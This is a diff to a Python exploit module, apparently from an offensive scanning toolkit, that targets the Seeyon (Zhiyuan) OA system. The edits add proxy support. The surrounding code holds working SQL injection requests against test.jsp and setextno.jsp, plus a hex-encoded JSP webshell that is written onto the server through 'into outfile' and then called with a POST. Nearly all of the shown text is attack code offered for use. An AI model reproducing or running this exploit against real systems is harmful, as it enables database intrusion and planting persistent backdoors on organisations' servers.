@@ -4,9 +4,11 @@
 import requests
 import random
 import re
-from Config.config_requests import headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+from Config.config_proxies import proxies
+from Config.config_requests import headers
+
+requests.packages.urllib3.disable_warnings()
 # 脚本信息
 ######################################################
 NAME='Seeyon_OA_SQLInjection'
@@ -19,8 +21,8 @@ def poc(target):
     result = {}
     vuln_url = target + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r1 = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+
+        r1 = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
         if '序号' in r1.text and "@@basedir" in r1.text and r1.status_code == 200:
             result['target'] = target
             result['poc'] = NAME
@@ -34,8 +36,7 @@ def exp(target):
     vuln_url = target + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
     vuln_ur2 = target + "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#"
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r1 = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+        r1 = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
         if '序号' in r1.text and "@@basedir" in r1.text and r1.status_code == 200:
             OA_dir = re.findall(r'>(.*)\\UFseeyon\\', r1.text)[0]
             OA_dir = OA_dir[:2] + '/' + OA_dir[3:]
@@ -49,7 +50,6 @@ def exp(target):
         print("目标 {} 请求失败".format(target), e)
 
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         r2 = requests.get(url=vuln_ur2, headers=headers, verify=False, timeout=5)
         if r2.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in r2.text:
             print ("[+] {} 存在致远OA setextno.jsp sql注入漏洞".format(target, vuln_ur2))
@@ -61,7 +61,6 @@ def exp(target):
 def exp1(target, OA_dir, webshell_name):
     vuln_url = target + "/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27".format(OA_dir)
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.get(url=vuln_url, verify=False, timeout=5)
         if 'already' in response.text and  response.status_code == 200:
             print("文件写入木马上传失败，目标已存在相同文件，请重新运行")
@@ -81,7 +80,6 @@ def exp2(target, webshell_name):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         print("[o] 正在请求：{}".format(vuln_url))
         response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
         if response.status_code == 200:
